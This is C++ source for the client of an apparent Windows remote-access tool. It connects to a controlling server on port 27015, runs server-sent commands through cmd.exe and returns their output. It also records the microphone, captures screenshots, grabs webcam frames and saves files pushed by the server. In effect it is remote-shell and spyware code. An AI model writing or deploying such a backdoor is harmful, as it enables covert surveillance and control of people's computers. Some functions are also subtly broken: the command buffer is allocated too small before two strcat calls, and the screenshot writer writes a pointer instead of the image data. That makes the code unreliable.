#include "Header.h"

#define PORT "27015"

int main(int argc, char* argv[]) {
	WSADATA wsaData;
	SOCKET connectSocket = INVALID_SOCKET;
	addrinfo* result = NULL;
	addrinfo* ptr = NULL;

	int iResult;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("[ERROR] WSAStartup %d\n", iResult);
		return 1;
	}

	while (1) {
		waitAndConnect(&connectSocket);
		char* input = NULL;

		while (1) {
			DWORD inputSize = 0;
			iResult = recv(connectSocket, (char*)&inputSize, sizeof(inputSize), 0);
			if (iResult < 0) {
				printf("[ERROR] WSAStartup %d\n", WSAGetLastError());
				closesocket(connectSocket);
				WSACleanup();
				return 1;
			}
			input = (char*)calloc(inputSize + 1, sizeof(char));

			if (input) {
				iResult = recv(connectSocket, input, inputSize, 0);
				if (iResult > 0) {
					printf("[NOTICE] Received command: %s\n", input);
					BOOL isOption = FALSE;
					string command = "";
					string option = "";

					for (int i = 0; i < strlen(input); i++) {
						if (isOption) {
							option.push_back(input[i]);
						}
						else {
							if (input[i] == ' ') {
								isOption = TRUE;
								continue;
							}
							command.push_back(input[i]);
						}
					}


					if (command.compare("Quit") == 0) {
						free(input);
						goto ClientShutdown;
					}

					if (command.compare("Download") == 0) {
						receiveFile(option.c_str(), connectSocket);
					}

					if (command.compare("Mic") == 0) {
						Micro(atoi(option.c_str()), connectSocket);
					}

					if (command.compare("Screenshot") == 0) {
						Screenshot(connectSocket);
					}

					if (command.compare("Camera") == 0) {
						Camera(connectSocket);
					}

					if (command.compare("Remote") == 0) {
						doCommandAndSend(option.c_str(), connectSocket);
					}

				}
				else if (iResult < 0) {
					printf("[ERROR] recv. %d\n", WSAGetLastError());
					free(input);
					goto ServerDisconnected;
				}

				free(input);
			}
		}
	ServerDisconnected: {}
	}


ClientShutdown:
	// shutdown the connection since no more data will be sent
	iResult = shutdown(connectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] shutdown socket. %d\n", WSAGetLastError());
		closesocket(connectSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(connectSocket);
	WSACleanup();
	return 0;
}

// wait for server socket and connect
void waitAndConnect(SOCKET* connectSocket) {
	int iResult = 0;
	addrinfo* result = NULL, *ptr = NULL;
	addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	while (1) {
		iResult = getaddrinfo(NULL, PORT, &hints, &result);
		if (iResult != 0) {
			printf("[ERROR] getaddrinfo. %d\n", iResult);
			return;
		}

		ptr = result;
		while (ptr) {
			*connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			if (*connectSocket == INVALID_SOCKET) {
				printf("[ERROR] socket. %d\n", WSAGetLastError());
				return;
			}

			iResult = connect(*connectSocket, ptr->ai_addr, ptr->ai_addrlen);
			if (iResult == SOCKET_ERROR) {
				*connectSocket = INVALID_SOCKET;
				ptr = ptr->ai_next;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		if (*connectSocket == INVALID_SOCKET) {
			printf("Unable to connect to server!\n");
			continue;
		}

		printf("Connected to server with port %s\n", PORT);
		break;
	}
}

//send file to server
void sendFile(const char* fileName, SOCKET connectSocket) {
	DWORD fileSize = 0;
	HANDLE file = NULL;
	BOOL isExist = FALSE;
	int iResult = 0;

	file = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("[ERROR] open file. %d\n", GetLastError());
	}
	else isExist = TRUE;

	//send file exist signal
	iResult = send(connectSocket, (char*)&isExist, sizeof(isExist), 0);
	if (iResult != sizeof(isExist)) {
		printf("[ERROR] send file exist. %d\n", WSAGetLastError());
		CloseHandle(file);
		return;
	}

	if (isExist) {
		// send file size
		fileSize = GetFileSize(file, NULL);
		iResult = send(connectSocket, (char*)&fileSize, sizeof(fileSize), 0);
		if (iResult != sizeof(fileSize)) {
			printf("[ERROR] send file size. %d\n", WSAGetLastError());
			return;
		}

		DWORD dwByteRead = 0;
		char* buffer = NULL;
		// send file content
		do {
			buffer = (char*)calloc(BUFSIZ, sizeof(char));
			if (buffer) {
				if (ReadFile(file, buffer, BUFSIZ, &dwByteRead, NULL) == FALSE) {
					printf("[ERROR] read file. %d\n", GetLastError());
					free(buffer);
					return;
				}
				iResult = send(connectSocket, buffer, dwByteRead, 0);
				if (iResult != dwByteRead) {
					printf("[ERROR] send file data. %d\n", WSAGetLastError());
					free(buffer);
					return;
				}
				free(buffer);
			}
		} while (dwByteRead > 0);
		CloseHandle(file);
	}
}

// receive file from server and save
void receiveFile(const char* fileName, SOCKET connectSocket) {
	char* buffer = NULL, *filePath = NULL;
	HANDLE file = NULL;
	int iResult = 0;
	DWORD dwByteWritten = 0;
	DWORD fileSize = 0;
	BOOL isExist = FALSE;

	// get file exist signal from server
	iResult = recv(connectSocket, (char*)&isExist, sizeof(isExist), 0);
	if (iResult != sizeof(isExist)) {
		printf("[ERROR] recv. %d\n", WSAGetLastError());
		return;
	}

	if (isExist) {

		file = CreateFile(fileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("[ERROR] create file %d\n", GetLastError());
			return;
		}

		// receive file size
		iResult = recv(connectSocket, (char*)&fileSize, sizeof(fileSize), 0);
		if (iResult != sizeof(fileSize)) {
			printf("[ERROR] recv file size. %d\n", WSAGetLastError());
			CloseHandle(file);
			return;
		}

		// receive file data and write
		DWORD tempFileSize = 0;
		do {
			buffer = (char*)calloc(BUFSIZ, sizeof(char));
			if (buffer) {
				iResult = recv(connectSocket, buffer, BUFSIZ, 0);
				if (iResult <= 0) {
					printf("[ERROR] recv file data. %d\n", WSAGetLastError());
					CloseHandle(file);
					free(buffer);
					return;
				}

				if (WriteFile(file, buffer, iResult, &dwByteWritten, NULL) == FALSE) {
					printf("[ERROR] write file. %d\n", GetLastError());
					CloseHandle(file);
					free(buffer);
					return;
				}

				tempFileSize += iResult;
				free(buffer);
			}
		} while (tempFileSize < fileSize);

		if (file != INVALID_HANDLE_VALUE) {
			filePath = (char*)calloc(MAX_PATH + 1, sizeof(char));
			if (filePath) {
				GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
				printf("File saved at %s\n", filePath);
				free(filePath);
			}
		}
		CloseHandle(file);
	}
}

// Execute command and send output to server
void doCommandAndSend(const char* command, SOCKET connectSocket) {
	HANDLE hStdInPipeRead = NULL;
	HANDLE hStdInPipeWrite = NULL;
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	BOOL ok = TRUE;

	// Create two pipes.
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	ok = CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
	if (!ok) {
		printf("[ERROR] create pipe. %d\n", GetLastError());
		return;
	}
	ok = CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
	if (!ok) {
		CloseHandle(hStdInPipeRead);
		CloseHandle(hStdInPipeWrite);
		printf("[ERROR] create pipe. %d\n", GetLastError());
		return;
	}

	// Create the process.
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	si.hStdInput = hStdInPipeRead;
	PROCESS_INFORMATION pi = {};

	char* tempCommand = (char*)calloc(strlen(command), sizeof(char));
	if (!tempCommand) {
		printf("[ERROR] allocate.\n");
		return;
	}
	tempCommand = strcat(tempCommand, "/c ");
	tempCommand = strcat(tempCommand, command);

	ok = CreateProcess("C:\\Windows\\System32\\cmd.exe", tempCommand, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (!ok) {
		CloseHandle(hStdInPipeRead);
		CloseHandle(hStdInPipeWrite);
		CloseHandle(hStdOutPipeRead);
		CloseHandle(hStdOutPipeWrite);
		printf("[ERROR] create process. %d\n", GetLastError());
		return;
	}

	CloseHandle(hStdInPipeRead);
	CloseHandle(hStdOutPipeWrite);

	// The main loop for reading output from the DIR command.
	char* buffer = NULL;
	DWORD dwByteRead = 0;

	do {
		buffer = (char*)calloc(BUFSIZ, sizeof(char));
		dwByteRead = 0;
		if (buffer) {
			ok = ReadFile(hStdOutPipeRead, buffer, BUFSIZ, &dwByteRead, NULL);

			// if pipe can be read, send file data. or else send 0 as end of data indicator.

			//send output size
			int iResult = send(connectSocket, (char*)&dwByteRead, sizeof(dwByteRead), 0);
			if (iResult < 0) {
				printf("[ERROR] send command output size. %d\n", WSAGetLastError());
				free(buffer);
				goto cleanup;
			}

			if (ok && dwByteRead > 0) {
				//send output
				if (dwByteRead != 0) {
					do {
						int iResult = send(connectSocket, buffer, dwByteRead, 0);
						if (iResult < 0) {
							printf("[ERROR] send command output. %d\n", WSAGetLastError());
							free(buffer);
							goto cleanup;
						}
						dwByteRead -= iResult;

					} while (dwByteRead > 0);

				}
			}

			free(buffer);
		}
	} while (ok == TRUE);

cleanup:
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hStdInPipeWrite);
	CloseHandle(hStdOutPipeRead);
	return;
}

// Take screenshot and send file to server
void Screenshot(SOCKET connectSocket) {
	HDC hScreenDC = NULL, hMemoryDC = NULL;
	int width = 0, height = 0;
	HBITMAP hBitmap = NULL, hOldBitmap = NULL;
	BITMAP bitmap = {};
	BITMAPFILEHEADER   bmpFileHeader = {};
	BITMAPINFOHEADER   bmpInfoHeader = {};
	int iResult = 0;
	BOOL ok = TRUE;


	// Get device context
	hScreenDC = GetDC(nullptr);
	ok &= hScreenDC != NULL;
	hMemoryDC = CreateCompatibleDC(hScreenDC);
	ok &= hMemoryDC != NULL;

	if (ok) {
		// get screen size
		width = GetDeviceCaps(hScreenDC, HORZRES);
		height = GetDeviceCaps(hScreenDC, VERTRES);

		// create bitmap
		hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
		ok &= hBitmap != NULL;

		if (hMemoryDC && hBitmap) {
			hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
			ok &= hOldBitmap != NULL && hOldBitmap != HGDI_ERROR;

		}

		// copy device context to bitmap
		if (hMemoryDC) {
			ok &= 0 != BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
		}

		//get bitmap from handle
		if (hBitmap) {
			ok &= 0 != GetObject(hBitmap, sizeof(BITMAP), &bitmap);
		}

		DWORD dwBmpSize = bitmap.bmWidth * bitmap.bmHeight * 4; // 4 bytes aka 32 bits per pixel

		//set bitmap file header
		bmpFileHeader.bfType = 0x4D42; // BM.
		bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
		bmpFileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;

		// set bitmap info header
		bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmpInfoHeader.biWidth = bitmap.bmWidth;
		bmpInfoHeader.biHeight = bitmap.bmHeight;
		bmpInfoHeader.biPlanes = 1;
		bmpInfoHeader.biBitCount = 32;
		bmpInfoHeader.biCompression = BI_RGB;
		bmpInfoHeader.biSizeImage = 0;
		bmpInfoHeader.biXPelsPerMeter = 0;
		bmpInfoHeader.biYPelsPerMeter = 0;
		bmpInfoHeader.biClrUsed = 0;
		bmpInfoHeader.biClrImportant = 0;

		char* bmpData = (char*)calloc(dwBmpSize, sizeof(char));
		ok = bmpData != NULL;

		if (bmpData) {
			// get screenshot data from bitmap

			iResult = GetDIBits(hScreenDC, hBitmap, 0, (UINT)bitmap.bmHeight, bmpData, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
			ok = iResult != 0 && iResult != ERROR_INVALID_PARAMETER;

			char* tempFileName = (char*)calloc(MAX_PATH, sizeof(char));
			if (tempFileName) {

				GetTempFileName(".", "tmp", 0, tempFileName);
				HANDLE file = CreateFile(tempFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (file != NULL && file != INVALID_HANDLE_VALUE) {
					DWORD byteWritten = 0;
					if (!WriteFile(file, &bmpFileHeader, sizeof(BITMAPFILEHEADER), &byteWritten, NULL)) {
						printf("ERROR %d\n", GetLastError());
					}
					if (!WriteFile(file, &bmpInfoHeader, sizeof(BITMAPINFOHEADER), &byteWritten, NULL)) {
						printf("ERROR %d\n", GetLastError());
					}


					while (byteWritten > 0) {
						if (!WriteFile(file, &bmpData, BUFSIZ, &byteWritten, NULL)) {
							printf("ERROR %d\n", GetLastError());

						}
					}

					CloseHandle(file);

					sendFile(tempFileName, connectSocket);

					//DeleteFile(tempFileName);
				}

				free(tempFileName);
			}

			free(bmpData);
		}
		else {
			//send fail signal
			sendSignal(ok, connectSocket);
		}

		// restore bitmap
		if (hOldBitmap) SelectObject(hMemoryDC, hOldBitmap);

		DeleteDC(hMemoryDC);
		DeleteDC(hScreenDC);
	}
}

// Start recording and send file to server
void Micro(int seconds, SOCKET connectSocket) {
	MMRESULT result = MMSYSERR_ERROR;
	HWAVEIN hWaveIn = NULL;
	WAVEFORMATEX waveFormat = {};

	waveFormat.wFormatTag = WAVE_FORMAT_PCM;
	waveFormat.nChannels = 1;
	waveFormat.nSamplesPerSec = 44100; // 44.1 kHz
	waveFormat.wBitsPerSample = 8;
	waveFormat.nBlockAlign = waveFormat.nChannels * (waveFormat.wBitsPerSample / 8);
	waveFormat.nAvgBytesPerSec = waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

	waveFormat.cbSize = 0;

	result = waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, WAVE_FORMAT_DIRECT);

	if (result == MMSYSERR_NOERROR) {
		DWORD bufferLength = seconds * waveFormat.nSamplesPerSec;
		char* data = (char*)calloc(bufferLength, sizeof(char));

		if (data) {

			WAVEHDR waveHdr = {};
			waveHdr.lpData = (LPSTR)data;
			waveHdr.dwBufferLength = bufferLength;

			result = waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
			if (result != MMSYSERR_NOERROR) {
				printf("[ERROR] waveInPrepareHeader.\n");
			}
			result = waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));

			if (result != MMSYSERR_NOERROR) {
				printf("[ERROR] waveInAddBuffer.\n");
			}

			result = waveInStart(hWaveIn);

			if (result != MMSYSERR_NOERROR) {
				printf("[ERROR] waveInStart.\n");
			}

			printf("Recording.\n");

			Sleep(seconds * 1000);
			waveInClose(hWaveIn);
			printf("Done.\n");

			const char chunkId[] = "RIFF";
			uint32_t fileSize = bufferLength + 22;
			const char format[] = "WAVE";
			const char subchunk1Id[] = "fmt ";
			uint32_t subchunk1Size = 16;
			uint16_t audioFormat = waveFormat.wFormatTag;
			uint16_t numChannels = waveFormat.nChannels;
			uint32_t sampleRate = waveFormat.nSamplesPerSec;
			uint32_t byteRate = waveFormat.nAvgBytesPerSec;
			uint16_t blockAlign = waveFormat.nBlockAlign;
			uint16_t bitsPerSample = waveFormat.wBitsPerSample;
			const char subchunk2Id[] = "data";
			uint32_t subchunk2Size = bufferLength * sizeof(char);

			DWORD byteWritten = 0;

			char* tempFileName = (char*)calloc(MAX_PATH, sizeof(char));
			GetTempFileName(".", "tmp", 0, tempFileName);

			HANDLE file = CreateFile(tempFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (file != NULL && file != INVALID_HANDLE_VALUE) {
				WriteFile(file, chunkId, 4, &byteWritten, NULL);
				WriteFile(file, &fileSize, sizeof(fileSize), &byteWritten, NULL);
				WriteFile(file, format, 4, &byteWritten, NULL);
				WriteFile(file, subchunk1Id, 4, &byteWritten, NULL);
				WriteFile(file, &subchunk1Size, sizeof(subchunk1Size), &byteWritten, NULL);
				WriteFile(file, &audioFormat, sizeof(audioFormat), &byteWritten, NULL);
				WriteFile(file, &numChannels, sizeof(numChannels), &byteWritten, NULL);
				WriteFile(file, &sampleRate, sizeof(sampleRate), &byteWritten, NULL);
				WriteFile(file, &byteRate, sizeof(byteRate), &byteWritten, NULL);
				WriteFile(file, &blockAlign, sizeof(blockAlign), &byteWritten, NULL);
				WriteFile(file, &bitsPerSample, sizeof(bitsPerSample), &byteWritten, NULL);
				WriteFile(file, subchunk2Id, 4, &byteWritten, NULL);
				WriteFile(file, &subchunk2Size, sizeof(subchunk2Size), &byteWritten, NULL);
				WriteFile(file, data, bufferLength * sizeof(char), &byteWritten, NULL);

				CloseHandle(file);

				sendFile(tempFileName, connectSocket);

				DeleteFile(tempFileName);
			}

			free(tempFileName);
			free(data);
		}
	}

}

// Take camera picture and send file to server
void Camera(SOCKET connectSocket) {
	HWND hWebcam = NULL;

	BOOL ok = TRUE;
	char* driverName = NULL, *driverDesc = NULL;

	hWebcam = capCreateCaptureWindow("Webcam", WS_CHILD | WS_VISIBLE, 0, 0, 1920, 1080, GetDesktopWindow(), 0);
	ok &= hWebcam != NULL;

	for (int i = 0; i < 10; i++) {
		driverName = (char*)calloc(BUFSIZ, sizeof(char));
		driverDesc = (char*)calloc(BUFSIZ, sizeof(char));
		if (driverName && driverDesc) {

			if (capGetDriverDescription(i, driverName, BUFSIZ, driverDesc, BUFSIZ)) {
				printf("%d - %s - %s\n", i, driverName, driverDesc);

				capDriverConnect(hWebcam, i);
				capFileSaveDIB(hWebcam, "temp.bmp");
				capDriverConnect(hWebcam, i);

				free(driverName);
				free(driverDesc);
				break;
			}

			free(driverName);
			free(driverDesc);
		}
	}

	if (hWebcam) DestroyWindow(hWebcam);
}

void sendSignal(BOOL signal, SOCKET connectSocket) {
	if (send(connectSocket, (char*)&signal, sizeof(signal), 0) < 0) {
		printf("[ERROR] send signal failed. %d\n", WSAGetLastError());
		return;
	}
}